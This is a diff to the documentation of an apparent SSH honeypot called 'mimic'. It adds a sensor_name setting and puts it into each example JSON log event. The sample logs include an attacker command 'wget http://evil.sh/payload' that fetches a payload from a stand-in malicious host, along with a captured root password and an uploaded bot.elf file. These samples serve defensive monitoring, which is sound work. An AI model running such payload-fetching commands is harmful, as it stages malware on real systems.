@@ -157,6 +157,7 @@ listen_addr       = "0.0.0.0"   # bind address
 port              = 2222         # port inside the container; map host 22 → 2222
 server_id         = "SSH-2.0-OpenSSH_9.2p1 Debian-2+deb12u3"
 hostname          = "debian"     # appears in the shell prompt and uname
+sensor_name       = "mimic"      # identifier in every log line (for multi-sensor setups)
 
 # Limits
 max_sessions      = 256          # global concurrent connection cap
@@ -199,25 +200,25 @@ All events are JSON lines on stdout. Pipe to `jq` or ship to your SIEM.
 
 ```jsonc
 // New connection
-{"timestamp":"…","level":"INFO","fields":{"event":"connection_opened","session_id":42,"peer":"1.2.3.4:54321"}}
+{"timestamp":"…","level":"INFO","fields":{"event":"connection_opened","sensor_name":"mimic","session_id":42,"peer":"1.2.3.4:54321"}}
 
 // Connection refused (over limit)
-{"fields":{"event":"connection_rejected","peer":"1.2.3.4:54322","reason":"per_ip_limit"}}
+{"fields":{"event":"connection_rejected","sensor_name":"mimic","peer":"1.2.3.4:54322","reason":"per_ip_limit"}}
 
 // Credential capture
-{"fields":{"event":"auth_attempt","session_id":42,"peer":"…","username":"root","method":"password","password":"hunter2","accepted":true}}
+{"fields":{"event":"auth_attempt","sensor_name":"mimic","session_id":42,"peer":"…","username":"root","method":"password","password":"hunter2","accepted":true}}
 
 // Command typed by attacker
-{"fields":{"event":"command","session_id":42,"peer":"…","command":"wget http://evil.sh/payload"}}
+{"fields":{"event":"command","sensor_name":"mimic","session_id":42,"peer":"…","command":"wget http://evil.sh/payload"}}
 
 // wget/curl download logged
-{"fields":{"event":"download","session_id":42,"peer":"…","tool":"wget","url":"http://evil.sh/payload","dest":"/tmp/payload"}}
+{"fields":{"event":"download","sensor_name":"mimic","session_id":42,"peer":"…","tool":"wget","url":"http://evil.sh/payload","dest":"/tmp/payload"}}
 
 // SCP upload captured
-{"fields":{"event":"upload","session_id":42,"peer":"…","filename":"bot.elf","target_path":"/tmp/bot.elf","size":98304,"sha256":"a3f…","stored_path":"quarantine/a3f…","truncated":false}}
+{"fields":{"event":"upload","sensor_name":"mimic","session_id":42,"peer":"…","filename":"bot.elf","target_path":"/tmp/bot.elf","size":98304,"sha256":"a3f…","stored_path":"quarantine/a3f…","truncated":false}}
 
 // Session ended
-{"fields":{"event":"connection_closed","session_id":42,"peer":"…"}}
+{"fields":{"event":"connection_closed","sensor_name":"mimic","session_id":42,"peer":"…"}}
 ```
 
 Parse with jq:
